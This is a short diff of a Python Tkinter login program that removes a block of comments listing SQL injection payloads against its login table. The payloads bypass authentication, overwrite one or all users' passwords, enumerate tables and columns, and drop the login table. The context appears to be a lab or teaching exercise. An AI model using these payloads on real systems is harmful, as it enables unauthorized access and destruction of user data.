@@ -87,13 +87,3 @@ login_button.pack(pady=20)
 
 # start the aprogram
 window.mainloop()
-
-#to Bypass the login try: Hassan' OR '1'='1
-#to update the password try:  x'; UPDATE login SET Password='hacked' WHERE Username='Turky'; --
-#to know the DB name: 1234' AND 1=(SELECT COUNT(*) FROM Username); --
-#if gives syntax error the table name is exest:  1234' OR username LIKE '%OS%'; --
-#to know the number of columns:  ' ORDER BY 3; --
-#to drop a table:  x'; DROP TABLE login; --
-# SELECT Username FROM login WHERE Username='x'; UPDATE login SET Password='hacked' WHERE Username='Turky'; --' AND Password='{password}'
-#to ubdate the user have t char try: x'; UPDATE login SET Password='pass' WHERE Username LIKE '%T%'; --
-#to chanege all the passwords: x'; UPDATE login SET Password='pass' WHERE Username LIKE '%%'; --
